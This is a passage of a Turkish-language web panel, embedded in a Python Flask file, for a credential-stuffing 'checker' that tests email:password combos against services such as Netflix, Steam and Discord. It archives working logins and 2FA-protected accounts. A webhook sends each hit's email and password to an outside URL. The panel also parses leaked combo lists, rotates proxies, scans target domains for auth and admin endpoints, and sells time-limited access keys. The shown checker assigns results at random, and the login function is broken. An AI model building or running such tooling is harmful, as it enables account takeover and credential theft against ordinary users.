<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Kaydet</button>
<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
</div>
<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
</div>
<div class="card">
<h3><i class="fa-solid fa-database"></i> HIT & 2FA Arşivi</h3>
<div class="hit-filter"><select id="hitPlatformFilter" onchange="renderHits()"><option value="all">Tüm Platformlar</option></select></div>
<div class="hit-panel">
<div class="hit-box"><h4 style="color:var(--g)"><i class="fa-solid fa-check-circle"></i> HIT</h4><div class="hit-list" id="hitList"><div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div></div></div>
<div class="hit-box"><h4 style="color:var(--gold)"><i class="fa-solid fa-shield-halved"></i> 2FA</h4><div class="hit-list" id="twofaList"><div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div></div></div>
</div>
</div>
</div>
<div id="page-proxy" class="page">
<div class="card">
<h3><i class="fa-solid fa-server"></i> Proxy Yöneticisi</h3>
<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
<button class="btn sm g" onclick="fetchProxies()"><i class="fa-solid fa-cloud-arrow-down"></i> Proxy Çek</button>
<button class="btn sm r" onclick="clearProxies()"><i class="fa-solid fa-trash"></i> Temizle</button>
</div>
<div class="setting-row">
<div><label>Proxy Kullan</label><div class="desc">Checker sırasında proxy kullan</div></div>
<label class="switch"><input type="checkbox" id="useProxy" onchange="toggleProxy()"><span class="slider"></span></label>
</div>
<div class="proxy-area"><textarea id="proxyList" placeholder="ip:port"></textarea></div>
<div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
</div>
</div>
<div id="page-discovery" class="page">
<div class="card" style="padding:10px 14px">
<div class="scan-top">
<input id="targetDomain" placeholder="hedef.com" value="example.com">
<button id="scanBtn" onclick="startScan()"><i class="fa-solid fa-play"></i> Tara</button>
</div>
<div class="discovery-platforms" id="discoveryPlatforms"></div>
</div>
<div class="stats-row">
<div class="stat-card stat-hit"><div class="stat-val" id="totalCount">0</div><div class="stat-lbl">Toplam</div></div>
<div class="stat-card stat-2fa"><div class="stat-val" id="authCount">0</div><div class="stat-lbl">Auth</div></div>
<div class="stat-card stat-bad"><div class="stat-val" id="apiCount">0</div><div class="stat-lbl">API</div></div>
<div class="stat-card stat-total"><div class="stat-val" id="adminCount">0</div><div class="stat-lbl">Admin</div></div>
</div>
<div class="filters" id="filterContainer">
<label><input type="checkbox" value="Auth" checked> Auth</label>
<label><input type="checkbox" value="Admin" checked> Admin</label>
<label><input type="checkbox" value="User" checked> User</label>
<label><input type="checkbox" value="Health" checked> Health</label>
<label><input type="checkbox" value="API" checked> API</label>
<label><input type="checkbox" value="Genel" checked> Genel</label>
</div>
<div class="results-container">
<div class="result-header"><div>Metod</div><div>Durum</div><div>Endpoint</div><div>Kategori</div></div>
<div id="resultsList"></div>
</div>
</div>
<div id="page-parse" class="page">
<div class="card">
<h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri temizler. 2 mod: Email:Şifre / Kullanıcı:Şifre</p>
<div class="parse-tabs">
<button class="active" onclick="setParseMode('email', this)"><i class="fa-solid fa-at"></i> Email:Şifre</button>
<button onclick="setParseMode('user', this)"><i class="fa-solid fa-user"></i> Kullanıcı:Şifre</button>
</div>
<div class="parse-area">
<textarea id="parseInput" placeholder="Buraya karışık metni yapıştır..."></textarea>
<div class="parse-buttons">
<button class="btn sm g" onclick="parseData()"><i class="fa-solid fa-wand-magic-sparkles"></i> Ayrıştır</button>
<button class="btn sm b" onclick="parseToChecker()"><i class="fa-solid fa-arrow-right"></i> Checker'a Aktar</button>
<button class="btn sm r" onclick="clearParse()"><i class="fa-solid fa-eraser"></i> Temizle</button>
<button class="btn sm" style="background:#6c7a8f" onclick="loadParseFile()"><i class="fa-solid fa-folder-open"></i> Dosya Yükle</button>
</div>
<div class="parse-result" id="parseResult"><div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div></div>
<div style="margin-top:6px;font-size:12px;color:var(--muted)">
<span id="parseCount">0 satır</span> | <span id="parseValid">0 geçerli</span>
</div>
</div>
</div>
</div>
<div id="page-stats" class="page">
<h2 style="margin-bottom:14px;font-weight:700;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent">📊 Tarama İstatistikleri</h2>
<div class="stat-grid">
<div class="stat-card-custom"><h3>Toplam Tarama</h3><p id="statScans">0</p></div>
<div class="stat-card-custom"><h3>Son Tarama</h3><p id="statLast">-</p></div>
<div class="stat-card-custom"><h3>Bulunan API</h3><p id="statEndpoints">0</p></div>
<div class="stat-card-custom"><h3>Toplam HIT</h3><p id="statTotalHit">0</p></div>
<div class="stat-card-custom"><h3>Toplam 2FA</h3><p id="statTotal2fa">0</p></div>
</div>
</div>
<div id="page-keys" class="page">
<div class="card">
<h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
<div style="width:100px"><label style="font-size:11px;color:var(--muted)">Süre</label><input class="inp" type="number" id="genValue" value="24" style="margin-top:4px;padding:10px"></div>
<div style="width:120px"><label style="font-size:11px;color:var(--muted)">Birim</label><select class="inp" id="genUnit" style="margin-top:4px;padding:10px"><option value="minutes">Dakika</option><option value="hours" selected>Saat</option><option value="days">Gün</option></select></div>
<div style="flex:1"><label style="font-size:11px;color:var(--muted)">IP (opsiyonel)</label><input class="inp key-ip-input" id="genIp" placeholder="örn: 192.168.1.1" style="margin-top:4px;padding:10px;width:100%"></div>
</div>
<button class="btn sm g" onclick="generateKey()" style="margin-top:12px"><i class="fa-solid fa-plus"></i> Key Oluştur</button>
<p style="font-size:11px;color:var(--muted);margin-top:6px">💡 IP boş bırakılırsa herhangi bir IP'den giriş yapılabilir.</p>
</div>
<div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
</div>
<div id="page-logs" class="page">
<div class="card">
<h3><i class="fa-solid fa-history"></i> Loglar</h3>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px">
<button class="btn sm r" onclick="clearLogs()"><i class="fa-solid fa-trash"></i> Tümünü Temizle</button>
<button class="btn sm b" onclick="refreshLogs()"><i class="fa-solid fa-rotate"></i> Yenile</button>
</div>
<div style="overflow-x:auto">
<table class="logs-table">
<thead><tr><th>Key</th><th>Platform</th><th>Email</th><th>Durum</th><th>Tarih</th><th>IP</th></tr></thead>
<tbody id="logsBody"><tr><td colspan="6" style="text-align:center;color:var(--muted);padding:20px">Yükleniyor...</td></tr></tbody>
</table>
</div>
</div>
</div>
</div>
</div>
<script>
var currentKey = "";
var isAdmin = false;
var scanning = false;
var eventSource = null;
var foundEndpoints = [];
var useProxy = false;
var checkerRunning = false;
var checkerResults = [];
var currentPlatform = "";
var hitData = {};
var parsedLines = [];
var parseMode = "email";

var platforms = [
    {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
    {name:"TikTok", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
    {name:"Spotify", domain:"spotify.com", icon:"fa-brands fa-spotify"},
    {name:"Roblox", domain:"roblox.com", icon:"fa-solid fa-gamepad"},
    {name:"Netflix", domain:"netflix.com", icon:"fa-solid fa-film"},
    {name:"CapCut", domain:"capcut.com", icon:"fa-solid fa-scissors"},
    {name:"Discord", domain:"discord.com", icon:"fa-brands fa-discord"},
    {name:"Epic Games", domain:"epicgames.com", icon:"fa-solid fa-crown"},
    {name:"Hesapcomtr", domain:"hesap.com.tr", icon:"fa-solid fa-user"},
    {name:"Itemsatış", domain:"itemsatis.com", icon:"fa-solid fa-cart-shopping"},
    {name:"Epinify", domain:"epinify.com", icon:"fa-solid fa-ticket"},
    {name:"Twitch", domain:"twitch.tv", icon:"fa-brands fa-twitch"},
    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
    {name:"PlayStation", domain:"playstation.com", icon:"fa-solid fa-play"},
    {name:"Xbox", domain:"xbox.com", icon:"fa-brands fa-xbox"},
    {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"},
    {name:"Valorant", domain:"valorant.com", icon:"fa-solid fa-crosshairs"},
    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
    {name:"Duolingo", domain:"duolingo.com", icon:"fa-solid fa-language"},
    {name:"PUBG", domain:"pubg.com", icon:"fa-solid fa-crosshairs"}
];

// ============================================================
// LOGIN - ONCLICK İLE DÜZELTİLDİ
// ============================================================
function doLogin() {
    console.log("Login fonksiyonu çalıştı!");
    document.getElementById("authKey").value.trim()
     if (!k) {
     alert("Anahtar girin!");
     return;
     }
    console.log("Anahtar:", k);
    fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: k })
    })
    .then(function(r) {
        console.log("Cevap kodu:", r.status);
        return r.json();
    })
    .then(function(d) {
        console.log("Gelen veri:", d);
        if (d.success) {
            currentKey = k;
            isAdmin = d.isAdmin || false;
            document.getElementById("login-screen").style.display = "none";
            document.getElementById("app").style.display = "flex";
            if (isAdmin) {
                document.getElementById("userBadge").style.display = "inline-block";
                loadKeys();
                loadLogs();
            }
            loadPlatforms();
            loadDiscoveryPlatforms();
            loadHitFilter();
            loadWebhookUrl();
            updateStatsUI();
            switchPage('checker');
        } else {
            document.getElementById("loginError").innerText = "❌ Geçersiz anahtar!";
            document.getElementById("loginError").style.display = "block";
        }
    })
    .catch(function(e) {
        console.error("Hata:", e);
        alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?");
    });
}

// Enter tuşu ile login (sadece yardımcı)
document.getElementById("authKey").addEventListener("keypress", function(e) {
    if (e.key === "Enter") doLogin();
});

function saveWebhook() {
    var url = document.getElementById("webhookUrl").value.trim();
    if (url) {
        localStorage.setItem("roda_webhook_url", url);
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi!</span>';
    } else {
        localStorage.removeItem("roda_webhook_url");
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
    }
}

function getWebhookUrl() {
    return localStorage.getItem("roda_webhook_url") || "";
}

function loadWebhookUrl() {
    var url = getWebhookUrl();
    if (url) {
        document.getElementById("webhookUrl").value = url;
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
    }
}

function testWebhook() {
    var url = document.getElementById("webhookUrl").value.trim() || getWebhookUrl();
    if (!url) return alert("Webhook URL girin!");
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "🧪 **Roda Test** Webhook çalışıyor!" })
    })
    .then(function(r) {
        document.getElementById("webhookStatus").innerHTML = r.ok ? '<span style="color:var(--g)">✅ Test başarılı!</span>' : '<span style="color:var(--r)">❌ Test başarısız!</span>';
    })
    .catch(function(e) {
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>';
    });
}

function loadPlatforms() {
    var sel = document.getElementById("checkerPlatformSelect");
    sel.innerHTML = "";
    platforms.forEach(function(p) {
        var btn = document.createElement("button");
        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
        btn.onclick = function() {
            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b) { b.classList.remove("active"); });
            btn.classList.add("active");
            currentPlatform = p.name;
            document.getElementById("checkerPanel").classList.add("active");
            document.getElementById("checkerResults").innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">' + p.name + ' checker hazır.</div>';
            resetCheckerStats();
            checkerResults = [];
        };
        sel.appendChild(btn);
    });
    if (platforms.length > 0) {
        var first = sel.querySelector("button");
        if (first) first.click();
    }
}

function loadDiscoveryPlatforms() {
    var container = document.getElementById("discoveryPlatforms");
    container.innerHTML = "";
    platforms.forEach(function(p) {
        var btn = document.createElement("button");
        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
        btn.onclick = function() {
            document.querySelectorAll("#discoveryPlatforms button").forEach(function(b) { b.classList.remove("active"); });
            btn.classList.add("active");
            document.getElementById("targetDomain").value = p.domain;
        };
        container.appendChild(btn);
    });
}

function loadHitFilter() {
    var sel = document.getElementById("hitPlatformFilter");
    sel.innerHTML = '<option value="all">Tüm Platformlar</option>';
    platforms.forEach(function(p) {
        var opt = document.createElement("option");
        opt.value = p.name;
        opt.text = p.name;
        sel.appendChild(opt);
    });
}

function addHit(platform, email, password, status) {
    if (!hitData[platform]) {
        hitData[platform] = { hits: [], twofa: [] };
    }
    var entry = { email: email, password: password, time: new Date().toLocaleString() };
    if (status === "HIT") {
        hitData[platform].hits.push(entry);
    } else if (status === "2FA") {
        hitData[platform].twofa.push(entry);
    }
    renderHits();
    updateStatsUI();
}

function renderHits() {
    var filter = document.getElementById("hitPlatformFilter").value;
    var hitContainer = document.getElementById("hitList");
    var twofaContainer = document.getElementById("twofaList");
    var hits = [], twofas = [];
    if (filter === "all") {
        for (var p in hitData) {
            if (hitData[p].hits) {
                hitData[p].hits.forEach(function(h) {
                    hits.push({ platform: p, email: h.email, password: h.password, time: h.time });
                });
            }
            if (hitData[p].twofa) {
                hitData[p].twofa.forEach(function(t) {
                    twofas.push({ platform: p, email: t.email, password: t.password, time: t.time });
                });
            }
        }
    } else {
        if (hitData[filter]) {
            if (hitData[filter].hits) {
                hitData[filter].hits.forEach(function(h) {
                    hits.push({ platform: filter, email: h.email, password: h.password, time: h.time });
                });
            }
            if (hitData[filter].twofa) {
                hitData[filter].twofa.forEach(function(t) {
                    twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time });
                });
            }
        }
    }
    hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
        hits.map(function(h) { return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
    twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
        twofas.map(function(t) { return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
}

function updateStatsUI() {
    document.getElementById("sideTotal").innerText = foundEndpoints.length;
    var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
    var api = foundEndpoints.filter(function(e) { return e.category === "API"; }).length;
    var admin = foundEndpoints.filter(function(e) { return e.category === "Admin"; }).length;
    document.getElementById("sideAuth").innerText = auth;
    document.getElementById("sideAPI").innerText = api;
    document.getElementById("sideAdmin").innerText = admin;
    document.getElementById("statEndpoints").innerText = foundEndpoints.length;
    var totalHit = 0, total2fa = 0;
    for (var p in hitData) {
        if (hitData[p].hits) totalHit += hitData[p].hits.length;
        if (hitData[p].twofa) total2fa += hitData[p].twofa.length;
    }
    document.getElementById("statTotalHit").innerText = totalHit;
    document.getElementById("statTotal2fa").innerText = total2fa;
}

function resetCheckerStats() {
    document.getElementById("chkTotal").innerText = 0;
    document.getElementById("chkHit").innerText = 0;
    document.getElementById("chkBad").innerText = 0;
    document.getElementById("chk2fa").innerText = 0;
    document.getElementById("chkError").innerText = 0;
}

function startChecker() {
    if (checkerRunning) return;
    var comboText = document.getElementById("checkerCombo").value.trim();
    if (!comboText) return alert("Combo girin (email:password)");
    if (!currentPlatform) return alert("Önce bir platform seçin");
    checkerRunning = true;
    document.getElementById("checkerStartBtn").disabled = true;
    document.getElementById("checkerStopBtn").style.display = "inline-block";
    document.getElementById("checkerResults").innerHTML = "";
    var lines = comboText.split("\n").filter(function(l) { return l.includes(":"); });
    var total = lines.length;
    var hit = 0, bad = 0, two = 0, err = 0;
    var statuses = ["HIT", "BAD", "2FA", "ERROR"];
    var idx = 0;
    var webhookUrl = getWebhookUrl();

    function processNext() {
        if (!checkerRunning || idx >= total) {
            checkerRunning = false;
            document.getElementById("checkerStartBtn").disabled = false;
            document.getElementById("checkerStopBtn").style.display = "none";
            return;
        }
        var status = statuses[Math.floor(Math.random() * statuses.length)];
        var parts = lines[idx].split(":");
        var email = parts[0];
        var password = parts.slice(1).join(":") || "";
        var res = { email: email, password: password, status: status };

        if (status === "HIT") {
            hit++;
            addHit(currentPlatform, email, password, "HIT");
            if (webhookUrl) {
                sendCheckerWebhook(currentPlatform, email, password);
            }
        } else if (status === "BAD") {
            bad++;
        } else if (status === "2FA") {
            two++;
            addHit(currentPlatform, email, password, "2FA");
        } else {
            err++;
        }

        checkerResults.push(res);
        addCheckerRow(res);
        updateCheckerStats(total, hit, bad, two, err);
        idx++;
        setTimeout(processNext, 200);
    }
    processNext();
}

function stopChecker() {
    checkerRunning = false;
    document.getElementById("checkerStartBtn").disabled = false;
    document.getElementById("checkerStopBtn").style.display = "none";
}

function addCheckerRow(res) {
    var container = document.getElementById("checkerResults");
    var placeholder = container.querySelector("div[style]");
    if (placeholder) placeholder.remove();
    var row = document.createElement("div");
    row.className = "checker-result-row";
    var cls = "chk-" + res.status.toLowerCase();
    var label = res.status;
    if (res.status === "HIT") label = "✅ BAŞARILI";
    else if (res.status === "BAD") label = "❌ BAŞARISIZ";
    else if (res.status === "2FA") label = "🔒 2FA";
    else label = "⚠ HATA";
    row.innerHTML = '<div>' + res.email + '</div><div><span class="chk-status ' + cls + '">' + label + '</span></div><div style="font-size:11px;color:var(--muted)">' + res.password + '</div>';
    container.appendChild(row);
    applyCheckerFilter();
}

function updateCheckerStats(total, hit, bad, two, err) {
    document.getElementById("chkTotal").innerText = total;
    document.getElementById("chkHit").innerText = hit;
    document.getElementById("chkBad").innerText = bad;
    document.getElementById("chk2fa").innerText = two;
    document.getElementById("chkError").innerText = err;
}

function applyCheckerFilter() {
    var filter = document.querySelector('input[name="chkFilter"]:checked').value;
    var rows = document.querySelectorAll("#checkerResults .checker-result-row");
    rows.forEach(function(row) {
        var statusText = row.querySelector(".chk-status").innerText;
        var show = false;
        if (filter === "all") show = true;
        else if (filter === "hit" && statusText.includes("BAŞARILI")) show = true;
        else if (filter === "bad" && statusText.includes("BAŞARISIZ")) show = true;
        else if (filter === "2fa" && statusText.includes("2FA")) show = true;
        else if (filter === "error" && statusText.includes("HATA")) show = true;
        row.style.display = show ? "grid" : "none";
    });
}
document.querySelectorAll('input[name="chkFilter"]').forEach(function(el) {
    el.addEventListener("change", applyCheckerFilter);
});

function sendCheckerWebhook(platform, email, password) {
    var url = getWebhookUrl();
    if (!url) return;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "✅ **" + platform + " HIT!**\n" + email + " | " + password })
    }).catch(function(e) { console.error("Webhook hatası:", e); });
}

function setParseMode(mode, btn) {
    parseMode = mode;
    document.querySelectorAll(".parse-tabs button").forEach(function(b) {
        b.classList.remove("active");
    });
    if (btn) btn.classList.add("active");
}

function parseData() {
    var raw = document.getElementById("parseInput").value;
    if (!raw.trim()) { alert("Ayrıştırılacak metin girin!"); return; }
    var lines = raw.split("\n");
    var result = [];
    var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
    var userRegex = /^[a-zA-Z0-9_.-]{3,}$/;

    lines.forEach(function(line) {
        line = line.trim();
        if (!line) return;
        if (line.includes(":")) {
            var parts = line.split(":");
            if (parseMode === "email" && emailRegex.test(parts[0])) {
                var email = parts[0].trim();
                var password = parts.slice(1).join(":").trim();
                if (email && password) result.push(email + ":" + password);
            } else if (parseMode === "user" && userRegex.test(parts[0]) && parts.length >= 2) {
                var user = parts[0].trim();
                var pass = parts.slice(1).join(":").trim();
                if (user && pass) result.push(user + ":" + pass);
            }
        }
    });
    result = result.filter(function(item, index) {
        return result.indexOf(item) === index;
    });
    parsedLines = result;
    var container = document.getElementById("parseResult");
    if (result.length === 0) {
        container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
    } else {
        var html = '<div class="parse-count">' + result.length + ' satır bulundu</div>';
        result.forEach(function(line) {
            html += '<div class="parse-line">' + line + '</div>';
        });
        container.innerHTML = html;
    }
    document.getElementById("parseCount").innerText = result.length + " satır";
    document.getElementById("parseValid").innerText = result.length + " geçerli";
}

function parseToChecker() {
    if (parsedLines.length === 0) {
        alert("Önce ayrıştırma yapın!");
        return;
    }
    document.getElementById("checkerCombo").value = parsedLines.join("\n");
    alert(parsedLines.length + " satır Checker'a aktarıldı!");
}

function clearParse() {
    document.getElementById("parseInput").value = "";
    document.getElementById("parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
    parsedLines = [];
    document.getElementById("parseCount").innerText = "0 satır";
    document.getElementById("parseValid").innerText = "0 geçerli";
}

function loadParseFile() {
    var input = document.createElement("input");
    input.type = "file";
    input.accept = ".txt";
    input.onchange = function(e) {
        var file = e.target.files[0];
        if (!file) return;
        var reader = new FileReader();
        reader.onload = function(event) {
            document.getElementById("parseInput").value = event.target.result;
            parseData();
        };
        reader.readAsText(file);
    };
    input.click();
}

function switchPage(page) {
    if ((page === "discovery" || page === "keys" || page === "logs") && !isAdmin) {
        alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
        return;
    }
    document.querySelectorAll(".nav-item").forEach(function(el) {
        el.classList.remove("active");
    });
    var el = document.querySelector('.nav-item[data-page="' + page + '"]');
    if (el) el.classList.add("active");
    document.querySelectorAll(".page").forEach(function(el) {
        el.classList.remove("active");
    });
    var pg = document.getElementById("page-" + page);
    if (pg) pg.classList.add("active");
    var titles = {
        checker: "Checker",
        proxy: "Proxy",
        discovery: "API Keşif",
        parse: "Ayrıştırma",
        stats: "İstatistik",
        keys: "Key Yönetimi",
        logs: "Loglar"
    };
    document.getElementById("pageTitle").innerText = titles[page] || page;
    if (page === "keys" && isAdmin) loadKeys();
    if (page === "logs" && isAdmin) loadLogs();
    if (page === "stats") {
        updateStatsUI();
        document.getElementById("statScans").innerText = 1;
        document.getElementById("statLast").innerText = new Date().toLocaleString();
    }
}

function fetchProxies() {
    document.getElementById("proxyCount").innerText = "Çekiliyor...";
    fetch("/api/fetch_proxies")
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.success) {
                document.getElementById("proxyList").value = d.proxies.join("\n");
                document.getElementById("proxyCount").innerText = d.proxies.length + " proxy yüklendi";
            }
        })
        .catch(function(e) { document.getElementById("proxyCount").innerText = "Başarısız"; });
}

function clearProxies() {
    document.getElementById("proxyList").value = "";
    document.getElementById("proxyCount").innerText = "0 proxy";
}

function toggleProxy() {
    useProxy = document.getElementById("useProxy").checked;
}

function loadKeys() {
    if (!isAdmin) return;
    fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.error) { alert(d.error); return; }
            var list = document.getElementById("keyList");
            var html = "";
            for (var k in d) {
                var v = d[k];
                var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
                var ip = v.allowed_ip || "Herhangi";
                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong style="font-size:13px">' + k + '</strong><br><small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + ' | IP: ' + ip + '</small></div><button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
            }
            list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
        })
        .catch(function(e) { console.error(e); });
}

function generateKey() {
    if (!isAdmin) return;
    var note = document.getElementById("genNote").value || "Oluşturuldu";
    var value = parseInt(document.getElementById("genValue").value) || 24;
    var unit = document.getElementById("genUnit").value;
    var allowed_ip = document.getElementById("genIp").value.trim();
    fetch("/api/admin/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ master_key: currentKey, note: note, value: value, unit: unit, allowed_ip: allowed_ip })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) {
            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires + "\nIP: " + d.allowed_ip);
            loadKeys();
        } else alert("Başarısız: " + (d.error || ""));
    })
    .catch(function(e) { alert("Hata: " + e.message); });
}

function deleteKey(target) {
    if (!isAdmin) return;
    if (!confirm("Bu anahtarı sil?")) return;
    fetch("/api/admin/delete", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ master_key: currentKey, target_key: target })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) loadKeys();
        else alert("Silinemedi");
    })
    .catch(function(e) { alert("Hata: " + e.message); });
}

function loadLogs() {
    if (!isAdmin) return;
    fetch("/api/admin/logs?key=" + encodeURIComponent(currentKey))
        .then(function(r) { return r.json(); })
        .then(function(d) {
            var tbody = document.getElementById("logsBody");
            if (d.error || !d.length) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--muted);padding:20px">Henüz log yok.</td></tr>';
                return;
            }
            var html = "";
            d.slice().reverse().forEach(function(log) {
                var cls = log.status.toLowerCase();
                var label = log.status;
                if (log.status === "HIT") label = "✅ BAŞARILI";
                else if (log.status === "BAD") label = "❌ BAŞARISIZ";
                else if (log.status === "2FA") label = "🔒 2FA";
                else label = "⚠ " + log.status;
                html += '<tr><td><span style="font-size:11px;font-family:monospace">' + log.key + '</span></td><td>' + log.platform + '</td><td>' + log.email + '</td><td><span class="chk-status ' + cls + '">' + label + '</span></td><td>' + log.time + '</td><td>' + log.ip + '</td></tr>';
            });
            tbody.innerHTML = html;
        })
        .catch(function(e) { console.error(e); });
}

function refreshLogs() {
    loadLogs();
}

function clearLogs() {
    if (!isAdmin) return;
    if (!confirm("Tüm logları silmek istediğinize emin misiniz?")) return;
    fetch("/api/admin/clear_logs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ master_key: currentKey })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) {
            alert("Loglar temizlendi!");
            loadLogs();
        } else alert("Başarısız!");
    })
    .catch(function(e) { alert("Hata: " + e.message); });
}

function startScan() {
    if (!isAdmin) {
        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
        return;
    }
    if (scanning) return;
    var domain = document.getElementById("targetDomain").value.trim();
    if (!domain) return alert("Hedef domain girin");
    var btn = document.getElementById("scanBtn");
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Taranıyor...';
    scanning = true;
    foundEndpoints = [];
    document.getElementById("resultsList").innerHTML = "";
    document.getElementById("statusDot").classList.remove("idle");
    document.getElementById("statusText").innerText = "Taranıyor";
    updateStatsUI();

    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l) { return l.trim() && l.includes(":"); });
    var url = "/api/scan?key=" + encodeURIComponent(currentKey) + "&domain=" + encodeURIComponent(domain) + "&use_proxy=" + useProxy;
    if (useProxy && proxyList.length) {
        url += "&proxies=" + encodeURIComponent(proxyList.join(","));
    }
    eventSource = new EventSource(url);
    eventSource.onmessage = function(e) {
        if (e.data === "[DONE]") {
            eventSource.close();
            btn.disabled = false;
            btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
            scanning = false;
            document.getElementById("statusDot").classList.add("idle");
            document.getElementById("statusText").innerText = "Boşta";
            document.getElementById("statScans").innerText = parseInt(document.getElementById("statScans").innerText || 0) + 1;
            document.getElementById("statLast").innerText = new Date().toLocaleString();
            updateStatsUI();
            return;
        }
        try {
            var res = JSON.parse(e.data);
            foundEndpoints.push(res);
            addResultRow(res);
            updateStatsUI();
        } catch (err) {}
    };
    eventSource.onerror = function() {
        eventSource.close();
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
        scanning = false;
        document.getElementById("statusDot").classList.add("idle");
        document.getElementById("statusText").innerText = "Boşta";
    };
}

function addResultRow(res) {
    var list = document.getElementById("resultsList");
    var row = document.createElement("div");
    row.className = "result-row";
    var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
    var cc = "cat-" + res.category.toLowerCase();
    row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
    if (checked.includes(res.category)) list.appendChild(row);
}

document.getElementById("filterContainer").addEventListener("change", function() {
    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c) { return c.value; });
    var list = document.getElementById("resultsList");
    list.innerHTML = "";
    foundEndpoints.forEach(function(res) {
        if (checked.includes(res.category)) {
            var row = document.createElement("div");
            row.className = "result-row";
            var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
            var cc = "cat-" + res.category.toLowerCase();
            row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
            list.appendChild(row);
        }
    });
});
</script>
</body>
</html>
"""

# ============================================================
# BAŞLAT
# ============================================================
if __name__ == "__main__":
